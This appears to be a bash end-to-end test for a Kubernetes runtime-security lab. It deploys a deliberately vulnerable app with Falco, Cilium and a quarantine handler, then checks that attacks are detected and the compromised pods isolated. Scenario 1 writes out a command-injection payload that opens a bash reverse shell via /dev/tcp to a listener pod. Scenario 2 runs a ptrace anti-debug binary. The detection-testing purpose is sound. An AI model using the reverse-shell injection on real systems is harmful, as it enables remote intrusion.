#!/usr/bin/env bash
#
# End-to-end test for the Kubernetes runtime-security lab.
#
# It stands up a disposable kind cluster with Cilium as the CNI, installs the
# full chain from the README Quickstart (vulnapp + handler + Falco +
# Falcosidekick), and then drives the two attack scenarios the lab detects,
# asserting the whole incident-response loop:
#
#   * a command-injection reverse shell trips Falco, the handler quarantines
#     exactly the compromised pod, Cilium isolates it both ways, the Service
#     drops it and the ReplicaSet restores two ready replicas;
#   * a ptrace anti-debug payload trips Falco and a second pod is quarantined;
#   * an arbitrary pod cannot reach the handler, and an unauthenticated webhook
#     call is rejected with 401.
#
# It is meant to run both locally against kind (OrbStack/Docker) and in CI.
# On any failure it dumps the logs and cluster state needed to debug, then
# (unless KEEP_CLUSTER=1) deletes the cluster.
#
# Usage:
#   e2e/run.sh
#
# Environment overrides:
#   CLUSTER_NAME     kind cluster name            (default: falco-e2e)
#   CILIUM_VERSION   Cilium Helm chart version    (default: 1.20.4)
#   FALCO_CHART_VERSION  Falco Helm chart version (default: 9.1.0)
#   NODE_PORT        vulnapp NodePort             (default: 32080)
#   KEEP_CLUSTER     1 to keep the cluster on exit for inspection
#   REUSE_CLUSTER    1 to reuse an existing cluster of the same name

set -Eeuo pipefail

CLUSTER_NAME="${CLUSTER_NAME:-falco-e2e}"
CILIUM_VERSION="${CILIUM_VERSION:-1.20.4}"
FALCO_CHART_VERSION="${FALCO_CHART_VERSION:-9.1.0}"
NODE_PORT="${NODE_PORT:-32080}"
GCC_IMAGE="gcc:14"
BUSYBOX_IMAGE="busybox:1.37"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$REPO_ROOT"
WORKDIR="$(mktemp -d)"

log()  { printf '\n\033[1;34m==> %s\033[0m\n' "$*"; }
ok()   { printf '\033[1;32m    OK: %s\033[0m\n' "$*"; }
fail() { printf '\033[1;31m    FAIL: %s\033[0m\n' "$*" >&2; return 1; }

dump_diagnostics() {
  printf '\n\033[1;33m######## DIAGNOSTICS ########\033[0m\n' >&2
  {
    echo "### pods (all namespaces) ###"
    kubectl get pods -A -o wide || true
    echo "### vulnapp endpointslices ###"
    kubectl -n default get endpointslices -l kubernetes.io/service-name=vulnapp -o wide || true
    echo "### pod labels in default ###"
    kubectl -n default get pods --show-labels || true
    echo "### falco logs ###"
    kubectl -n falco logs ds/falco --all-containers --tail=200 || true
    echo "### falcosidekick logs ###"
    kubectl -n falco logs deploy/falco-falcosidekick --tail=200 || true
    echo "### handler logs ###"
    kubectl -n default logs deploy/falco-handler --tail=200 || true
    echo "### cilium status ###"
    kubectl -n kube-system exec ds/cilium -c cilium-agent -- cilium-dbg status --brief || true
    echo "### recent events ###"
    kubectl get events -A --sort-by=.lastTimestamp 2>/dev/null | tail -60 || true
  } >&2
  printf '\033[1;33m######## END DIAGNOSTICS ########\033[0m\n' >&2
}

on_err()  { printf '\n\033[1;31mE2E FAILED (line %s)\033[0m\n' "$1" >&2; dump_diagnostics; }
on_exit() {
  local rc=$?
  rm -rf "$WORKDIR" 2>/dev/null || true
  if [ "${KEEP_CLUSTER:-0}" = "1" ]; then
    echo "KEEP_CLUSTER=1: leaving kind cluster '$CLUSTER_NAME' in place."
  else
    log "Deleting kind cluster '$CLUSTER_NAME'"
    kind delete cluster --name "$CLUSTER_NAME" >/dev/null 2>&1 || true
  fi
  exit "$rc"
}
trap 'on_err $LINENO' ERR
trap on_exit EXIT

# wait_for <description> <timeout-seconds> <interval-seconds> <command...>
# Polls <command> until it succeeds or the timeout elapses.
wait_for() {
  local desc="$1" timeout="$2" interval="$3"; shift 3
  local deadline=$(( $(date +%s) + timeout ))
  until "$@"; do
    if [ "$(date +%s)" -ge "$deadline" ]; then
      fail "timed out after ${timeout}s waiting for: ${desc}"
    fi
    sleep "$interval"
  done
}

# ---- cluster-state predicates (quiet; used with wait_for) -------------------

tainted_pod_names() {
  kubectl -n default get pods \
    -l 'tainted-by-falco=true,security-lab/managed-by=falco-handler' \
    -o jsonpath='{.items[*].metadata.name}' 2>/dev/null
}

count_tainted() {
  # shellcheck disable=SC2086
  set -- $(tainted_pod_names); echo $#
}

have_n_tainted() { [ "$(count_tainted)" -eq "$1" ]; }

healthy_pod_name() {
  kubectl -n default get pods -l app=vulnapp \
    --field-selector=status.phase=Running \
    -o jsonpath='{.items[0].metadata.name}' 2>/dev/null
}

pod_ip() {
  kubectl -n default get pod "$1" -o jsonpath='{.status.podIP}' 2>/dev/null
}

vulnapp_two_ready() {
  [ "$(kubectl -n default get deploy/vulnapp -o jsonpath='{.status.readyReplicas}' 2>/dev/null)" = "2" ]
}

endpointslice_has_ip() {
  kubectl -n default get endpointslices -l kubernetes.io/service-name=vulnapp \
    -o jsonpath='{.items[*].endpoints[*].addresses[*]}' 2>/dev/null \
    | tr ' ' '\n' | grep -qx "$1"
}
endpointslice_lacks_ip() { ! endpointslice_has_ip "$1"; }

# TCP reachability probes. The vulnapp image has python (no curl/nc); the
# busybox listener has nc. Both are wrapped so an expected failure does not
# trip `set -e`.
tcp_from_vulnapp() { # <pod> <ip> <port>
  # -i is required so the heredoc reaches `python3 -` inside the container.
  kubectl -n default exec -i "$1" -c vulnapp -- python3 - "$2" "$3" <<'PY' >/dev/null 2>&1
import socket, sys
s = socket.socket(); s.settimeout(4)
try:
    s.connect((sys.argv[1], int(sys.argv[2]))); s.close()
except Exception:
    sys.exit(1)
PY
}

tcp_from_listener() { # <ip> <port>
  kubectl -n default exec listener -- \
    timeout 8 nc -w 4 "$1" "$2" </dev/null >/dev/null 2>&1
}

# ---- 0. preflight -----------------------------------------------------------

log "Preflight: checking required tools"
for tool in docker kind kubectl helm openssl curl; do
  command -v "$tool" >/dev/null 2>&1 || fail "required tool not found: $tool"
done
ok "docker, kind, kubectl, helm, openssl, curl present"

# ---- 1. kind cluster with Cilium as CNI -------------------------------------

if kind get clusters 2>/dev/null | grep -qx "$CLUSTER_NAME"; then
  if [ "${REUSE_CLUSTER:-0}" = "1" ]; then
    log "Reusing existing kind cluster '$CLUSTER_NAME'"
  else
    log "Deleting stale kind cluster '$CLUSTER_NAME'"
    kind delete cluster --name "$CLUSTER_NAME"
    log "Creating kind cluster '$CLUSTER_NAME' (default CNI disabled)"
    # No --wait: with the default CNI disabled the nodes stay NotReady until
    # Cilium is installed below.
    kind create cluster --name "$CLUSTER_NAME" --config e2e/kind-config.yaml
  fi
else
  log "Creating kind cluster '$CLUSTER_NAME' (default CNI disabled)"
  # No --wait: with the default CNI disabled the nodes stay NotReady until
  # Cilium is installed below.
  kind create cluster --name "$CLUSTER_NAME" --config e2e/kind-config.yaml
fi
kubectl config use-context "kind-${CLUSTER_NAME}"

log "Installing Cilium ${CILIUM_VERSION} as the CNI"
helm repo add cilium https://helm.cilium.io >/dev/null
helm repo update cilium >/dev/null
# Minimal kind-friendly install: kube-proxy is left in place (so the NodePort
# keeps working) and IPAM is delegated to Kubernetes.
helm upgrade --install cilium cilium/cilium --version "$CILIUM_VERSION" \
  --namespace kube-system \
  --set image.pullPolicy=IfNotPresent \
  --set ipam.mode=kubernetes \
  --wait --timeout 5m
kubectl -n kube-system rollout status ds/cilium --timeout=180s
kubectl -n kube-system rollout status deploy/cilium-operator --timeout=180s
kubectl wait --for=condition=Ready nodes --all --timeout=180s
ok "Cilium is up and nodes are Ready"

# ---- 2. build and load the lab images ---------------------------------------

log "Building and loading lab images (:lab-v2)"
docker build -t vulnapp:lab-v2 material/vulnapp
docker build -t falco-handler:lab-v2 material/falco_handler/src
kind load docker-image vulnapp:lab-v2 falco-handler:lab-v2 --name "$CLUSTER_NAME"
ok "Images loaded into the cluster"

# ---- 3. deploy target, quarantine policy, handler (README Quickstart) -------

log "Deploying the target and the Cilium quarantine policy"
kubectl apply -f material/manifests/isolate-tainted-policy.yaml
kubectl apply -f material/manifests/vulnapp-deployment.yaml
kubectl apply -f material/manifests/vulnapp-service.yaml
kubectl apply -f material/manifests/vulnapp-pdb.yaml
kubectl -n default rollout status deployment/vulnapp --timeout=180s

log "Deploying the handler with a freshly generated webhook token"
FALCO_WEBHOOK_TOKEN="$(openssl rand -hex 32)"
kubectl -n default create secret generic falco-handler-auth \
  --from-literal=webhook-token="$FALCO_WEBHOOK_TOKEN" \
  --dry-run=client -o yaml | kubectl apply -f -
kubectl apply -f material/falco_handler/falco-handler-rbac.yaml
kubectl apply -f material/falco_handler/falco-handler-service.yaml
kubectl apply -f material/falco_handler/falco-handler-networkpolicy.yaml
kubectl apply -f material/falco_handler/falco-handler-deployment.yaml
kubectl -n default rollout status deployment/falco-handler --timeout=180s

# ---- 4. attacker listener ---------------------------------------------------

log "Deploying the busybox listener (reverse-shell collector)"
kubectl apply -f e2e/listener.yaml
kubectl -n default wait --for=condition=Ready pod/listener --timeout=120s

# ---- 5. install Falco + Falcosidekick (README Quickstart) -------------------

log "Installing Falco ${FALCO_CHART_VERSION} and Falcosidekick"
kubectl create namespace falco --dry-run=client -o yaml | kubectl apply -f -
kubectl apply -f material/falco/falcosidekick-networkpolicy.yaml
helm repo add falcosecurity https://falcosecurity.github.io/charts >/dev/null
helm repo update falcosecurity >/dev/null
cp material/falco/falco-values.example.yaml "$WORKDIR/values.yaml"
FALCO_WEBHOOK_TOKEN="$FALCO_WEBHOOK_TOKEN" \
  perl -pi -e 's/CHANGE_ME/$ENV{FALCO_WEBHOOK_TOKEN}/g' "$WORKDIR/values.yaml"
helm upgrade --install falco falcosecurity/falco --version "$FALCO_CHART_VERSION" \
  --reset-values -n falco -f "$WORKDIR/values.yaml" --wait --timeout 10m
kubectl -n falco rollout status ds/falco --timeout=300s
kubectl -n falco rollout status deploy/falco-falcosidekick --timeout=180s
# Give Falco a moment to finish loading rules and attach to the containers.
sleep 15
ok "Detection chain installed"

# ---- 6. scenario 1: command-injection reverse shell -------------------------

log "Scenario 1: command-injection reverse shell via the NodePort"
# The payload backgrounds the reverse shell (&) so ping still returns and the
# HTTP request completes. A single POST lands on exactly one of the two
# replicas, so exactly one pod should be quarantined.
PAYLOAD="127.0.0.1; bash -c 'bash -i >& /dev/tcp/listener/4444 0>&1' &"
curl -s -o /dev/null --max-time 20 -X POST "http://127.0.0.1:${NODE_PORT}/" \
  --data-urlencode "host=${PAYLOAD}" || true

log "Asserting the compromised pod is quarantined"
wait_for "exactly one quarantined pod" 240 3 have_n_tainted 1
TAINTED_POD="$(tainted_pod_names)"
ok "quarantined pod: ${TAINTED_POD}"

# It must carry the manager label and have lost its app selector label.
MANAGED_BY="$(kubectl -n default get pod "$TAINTED_POD" \
  -o "jsonpath={.metadata.labels['security-lab/managed-by']}")"
[ "$MANAGED_BY" = "falco-handler" ] || fail "manager label missing on ${TAINTED_POD}"
APP_LABEL="$(kubectl -n default get pod "$TAINTED_POD" \
  -o jsonpath='{.metadata.labels.app}')"
[ -z "$APP_LABEL" ] || fail "quarantined pod still has app=${APP_LABEL}"
ok "labels: tainted-by-falco=true, security-lab/managed-by=falco-handler, app removed"

TAINTED_IP="$(pod_ip "$TAINTED_POD")"
[ -n "$TAINTED_IP" ] || fail "could not read quarantined pod IP"
wait_for "tainted IP ${TAINTED_IP} removed from EndpointSlices" 120 3 \
  endpointslice_lacks_ip "$TAINTED_IP"
ok "tainted IP ${TAINTED_IP} is no longer in the vulnapp EndpointSlices"

wait_for "vulnapp back to 2 ready replicas" 180 3 vulnapp_two_ready
ok "vulnapp recovered to 2 ready replicas"

# ---- 7. network isolation, both directions ---------------------------------

log "Asserting Cilium isolation of the quarantined pod"
HEALTHY_POD="$(healthy_pod_name)"
[ -n "$HEALTHY_POD" ] || fail "no healthy vulnapp pod found"
HEALTHY_IP="$(pod_ip "$HEALTHY_POD")"
LISTENER_IP="$(pod_ip listener)"

# egress: tainted pod must not reach the listener; a healthy pod must.
if tcp_from_vulnapp "$TAINTED_POD" "$LISTENER_IP" 4444; then
  fail "quarantined pod reached the listener (egress not blocked)"
fi
ok "egress from quarantined pod to listener is blocked"
wait_for "healthy pod can reach listener" 60 3 \
  tcp_from_vulnapp "$HEALTHY_POD" "$LISTENER_IP" 4444
ok "egress from a healthy pod to the listener works"

# ingress: listener must not reach the tainted pod; it must reach a healthy one.
if tcp_from_listener "$TAINTED_IP" 8080; then
  fail "listener reached the quarantined pod on :8080 (ingress not blocked)"
fi
ok "ingress from listener to quarantined pod :8080 is blocked"
wait_for "listener can reach a healthy pod" 60 3 \
  tcp_from_listener "$HEALTHY_IP" 8080
ok "ingress from listener to a healthy pod :8080 works"

# ---- 8. scenario 2: ptrace anti-debug payload -------------------------------

log "Scenario 2: ptrace anti-debug payload inside a healthy pod"
PTRACE_BIN="$WORKDIR/ptrace"
if [ "$(uname -s)" = "Linux" ] && command -v gcc >/dev/null 2>&1; then
  gcc -static -o "$PTRACE_BIN" material/payloads/ptrace.c
else
  # No native Linux gcc (e.g. local macOS run): build a static binary for the
  # kind node's architecture inside a pinned gcc image.
  docker run --rm \
    -v "$REPO_ROOT/material/payloads:/src:ro" \
    -v "$WORKDIR:/out" \
    -w /src "$GCC_IMAGE" \
    gcc -static -o /out/ptrace ptrace.c
fi
ok "built static ptrace payload"

PTRACE_POD="$(healthy_pod_name)"
kubectl -n default cp "$PTRACE_BIN" "${PTRACE_POD}:/tmp/ptrace" -c vulnapp
kubectl -n default exec "$PTRACE_POD" -c vulnapp -- chmod +x /tmp/ptrace
kubectl -n default exec "$PTRACE_POD" -c vulnapp -- /tmp/ptrace || true

log "Asserting a second pod is quarantined"
wait_for "a second quarantined pod" 240 3 have_n_tainted 2
SECOND_TAINTED="$(tainted_pod_names | tr ' ' '\n' | grep -vx "$TAINTED_POD" | head -n1)"
[ -n "$SECOND_TAINTED" ] || fail "second quarantine did not target a new pod"
ok "second quarantined pod: ${SECOND_TAINTED}"
wait_for "vulnapp back to 2 ready replicas" 180 3 vulnapp_two_ready
ok "vulnapp recovered again to 2 ready replicas"

# ---- 9. negative controls ---------------------------------------------------

log "Negative control: an arbitrary pod cannot reach the handler Service"
NETCHECK="netcheck-$RANDOM"
NC_OUT="$(kubectl -n default run "$NETCHECK" --image="$BUSYBOX_IMAGE" \
  --restart=Never --rm -i --quiet --command -- \
  sh -c 'timeout 8 nc -w 4 falco-handler 80 </dev/null; echo "RC=$?"' 2>/dev/null || true)"
# Without an RC= line the probe pod never ran, which proves nothing.
echo "$NC_OUT" | grep -q 'RC=' || fail "netcheck pod did not run: ${NC_OUT:-<no output>}"
if echo "$NC_OUT" | grep -qx 'RC=0'; then
  fail "arbitrary pod reached the handler (NetworkPolicy not enforced)"
fi
ok "handler Service is unreachable from an unrelated pod"

log "Negative control: an unauthenticated webhook call is rejected"
kubectl -n default port-forward deploy/falco-handler 15000:5000 \
  >"$WORKDIR/pf.log" 2>&1 &
PF_PID=$!
pf_ready() { curl -fsS -o /dev/null --max-time 2 http://127.0.0.1:15000/health; }
wait_for "handler port-forward" 30 1 pf_ready
HTTP_CODE="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
  -X POST http://127.0.0.1:15000/ \
  -H 'Content-Type: application/json' -d '{"rule":"x","source":"syscall"}')"
kill "$PF_PID" >/dev/null 2>&1 || true
wait "$PF_PID" 2>/dev/null || true
[ "$HTTP_CODE" = "401" ] || fail "unauthenticated POST returned ${HTTP_CODE}, expected 401"
ok "unauthenticated webhook call rejected with 401"

log "ALL E2E ASSERTIONS PASSED"
